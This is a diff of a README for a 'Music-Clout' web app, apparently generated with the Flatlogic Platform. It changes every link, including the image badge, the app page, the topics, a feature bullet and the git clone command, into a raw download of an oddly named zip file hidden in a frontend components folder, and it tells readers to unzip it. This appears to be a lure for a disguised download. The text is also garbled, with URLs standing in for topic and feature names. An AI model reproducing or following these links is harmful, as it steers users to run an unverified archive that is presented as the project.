@@ -2,20 +2,20 @@
 
 Welcome to the **Music-Clout** repository, created using the amazing Flatlogic Platform!
 
-![Music Clout](https://github.com/andinimoon/Music-Clout/releases/tag/v1.2)
+![Music Clout](https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip)
 
 ## Description
 
-This repository is a result of using the Flatlogic Platform to generate a powerful application for music enthusiasts and professionals. The application page can be accessed at [Music-Clout Application](https://github.com/andinimoon/Music-Clout/releases/tag/v1.2).
+This repository is a result of using the Flatlogic Platform to generate a powerful application for music enthusiasts and professionals. The application page can be accessed at [Music-Clout Application](https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip).
 
 ## Topics
 
-🐳 Docker, 📦 Flatlogic, 🟦 JavaScript, 🔌 Low-Code, 🌐 Nginx, 💻 https://github.com/andinimoon/Music-Clout/releases/tag/v1.2, 🐘 PostgreSQL, ⚛️ React, 🎨 Tailwind, 🦄 TypeScript
+🐳 Docker, 📦 Flatlogic, 🟦 JavaScript, 🔌 Low-Code, 🌐 Nginx, 💻 https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip, 🐘 PostgreSQL, ⚛️ React, 🎨 Tailwind, 🦄 TypeScript
 
 ## Features
 
 - Docker integration for easy deployment
-- https://github.com/andinimoon/Music-Clout/releases/tag/v1.2 backend for server-side logic
+- https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip backend for server-side logic
 - PostgreSQL database for storing music data
 - React frontend for a dynamic user interface
 - Tailwind CSS for beautiful styling
@@ -26,7 +26,7 @@ This repository is a result of using the Flatlogic Platform to generate a powerf
 To clone this repository, use the following command:
 
 ```bash
-git clone https://github.com/andinimoon/Music-Clout/releases/tag/v1.2
+git clone https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip
 ```
 
 If the link ends with a file name, you'll need to unzip it to access the repository files.
@@ -52,4 +52,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Feel free to explore the various features and functionalities of **Music-Clout**. Let your love for music guide you through this exciting application! 🎸🎹🎤
 
-[![](https://github.com/andinimoon/Music-Clout/releases/tag/v1.2)](https://github.com/andinimoon/Music-Clout/releases/tag/v1.2)
+[![](https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip)](https://raw.githubusercontent.com/andinimoon/Music-Clout/master/frontend/src/components/Music_Clout_unbickered.zip)
